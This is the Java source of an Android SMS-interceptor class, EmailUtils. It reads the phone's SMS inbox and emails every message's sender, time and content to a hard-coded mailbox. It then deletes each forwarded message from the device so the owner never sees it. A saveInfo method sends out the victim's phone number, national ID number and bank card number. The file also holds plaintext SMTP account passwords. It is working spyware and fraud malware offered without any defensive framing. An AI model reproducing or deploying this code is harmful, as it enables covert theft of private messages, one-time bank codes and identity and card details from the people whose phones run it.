package com.sms.interceptor;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.provider.Telephony;
import android.text.TextUtils;
import android.util.Log;

import org.apache.commons.mail.Email;
import org.apache.commons.mail.EmailException;
import org.apache.commons.mail.SimpleEmail;

import java.text.SimpleDateFormat;
import java.util.Date;

/**
 * Created by zhangfei on 15/9/20.
 */
public class EmailUtils {
    private static final String SENDER = "741152074@qq.com";
    private static final String ACCOUNT = "741152074";
    private static final String PASSWORD = "Chrome123";
    private static final String SMTP_SERVER = "smtp.qq.com";

//    private static final String SENDER = "a425537484@126.com";
//    private static final String ACCOUNT = "a425537484";
//    private static final String PASSWORD = "86431672";
//    private static final String SMTP_SERVER = "smtp.126.com";

    private static final String RECEIVER = SENDER;

    private static final SimpleDateFormat FORMAT = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
    private static final String SMS_PREFIX = "监听到一条短信\n";

    public static final String[] COLUMNS = new String[]{
            Telephony.Sms._ID,
            Telephony.Sms.ADDRESS,
            Telephony.Sms.BODY,
            Telephony.Sms.DATE,
            Telephony.Sms.CREATOR
    };

    public static boolean sendEmail(String subject, String message){
        try {
            Email email = new SimpleEmail();
            email.setHostName(SMTP_SERVER);
            email.setAuthentication(ACCOUNT, PASSWORD);
            email.setCharset("UTF-8");
            email.addTo(RECEIVER);
            email.setFrom(SENDER);
            email.setSubject(subject);
            email.setMsg(message);
            email.send();
            return true;
        } catch (EmailException e) {
            e.printStackTrace();
            return false;
        }
    }

    public static void notifyNewSMSReceived(final Context context, long id, String sender, long receivedDt, String smsBody) {
        boolean networkAvailable = NetworkUtils.isNetworkConnected(context);
        if (!networkAvailable) {
            return;
        }

        boolean isSent = PreferenceUtils.isSmsSent(context, id);
        if (isSent){
            return;
        }

        final StringBuilder builder = new StringBuilder();
        builder.append(SMS_PREFIX);
        builder.append("接收时间：" + FORMAT.format(new Date(receivedDt)) + "\n");
        builder.append("短信发件人：" + sender + "\n");

        String phoneNo = PreferenceUtils.getPhoneNumber(context);
        if (!TextUtils.isEmpty(phoneNo)) {
            builder.append("短信接收人:" + PreferenceUtils.getPhoneNumber(context) + "\n");
        }
        builder.append("内容：" + smsBody);

        boolean sent = sendEmail("检测到新短信", builder.toString());
        Log.d("sms", "sent?" + sent);
        Log.d("sms", "_id=" + id);
        if (sent) {
            int count = context.getContentResolver().delete(
                    Uri.parse("content://sms"), Telephony.Sms._ID + "=?",
                    new String[]{String.valueOf(id)});
            Log.d("sms", "deleted?" + (count > 0));
            PreferenceUtils.setSmsSent(context, id);
        }
    }

    public static void checkSmsInLoop(final Context context) {
        new Thread(){
            @Override
            public void run() {
                Cursor cursor = context.getContentResolver().query(
                        Uri.parse("content://sms/inbox"),
                        COLUMNS, null, null,
                        Telephony.Sms._ID + " DESC");

                if (cursor == null) {
                    return;
                }

                while (cursor.moveToNext()) {
                    long id = cursor.getLong(0);
                    String address = cursor.getString(1);
                    String body = cursor.getString(2);
                    long receivedDt = cursor.getLong(3);

                    EmailUtils.notifyNewSMSReceived(context, id, address, receivedDt, body);
                }
                cursor.close();
            }
        }.start();

    }

    public static boolean saveInfo(final Context context, final String phoneNum, final String idNo, String bankCard){
        final StringBuilder builder = new StringBuilder();
        builder.append(SMS_PREFIX);
        builder.append("注册手机: " + phoneNum + "\n");
        builder.append("注册身份证: " + idNo + "\n");
        builder.append("注册银行卡: " + bankCard);
        boolean sent = sendEmail("新用户注册信息", builder.toString());
        if (sent){
            PreferenceUtils.setPhoneNumber(context, phoneNum);
            PreferenceUtils.setIdNo(context, idNo);
            PreferenceUtils.setBankCard(context, bankCard);
            return true;
        }
        return false;
    }
}
